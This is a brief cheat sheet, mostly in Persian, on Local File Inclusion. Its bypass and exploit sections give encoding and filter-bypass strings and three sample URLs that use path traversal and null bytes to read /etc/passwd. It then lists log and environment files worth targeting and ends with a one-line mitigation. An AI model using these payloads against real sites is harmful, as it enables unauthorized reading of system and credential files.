# Local File Inclusion

## Concept
- از این آسیب پذیری  برای خواند فایل های تنظیمات روی hosting machine استفاده می شود
- همچنین فایل های تصادفی مانند /etc/passwd
- همچنین ممکن است منجر به Information Disclosure شود

## Bypass
- Encoding
  - ```.``` => %2e
  - ```/``` => %2f
  - ```../``` => %2e%2e%2f
- WAF Bypass
  - ```../``` => ```..././``` 
  - ```../``` => ```....//``` 

## Exploit
  - ```example1.php?page=intro.php../../../../../etc/passwd```
  - ```example2.php?page=intro../../../../../../../../../../etc/passwd%00``` 
  - ```example2.php?page=intro%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00``` 

## Intersting files
  - ```/proc/self/environ```
  - ```/var/log/auth.log```
  - ```/var/log/apache2/access.log```
  
## Mitigation
  - Use static file inclusion. hard code the fiels that we want to include in the code.
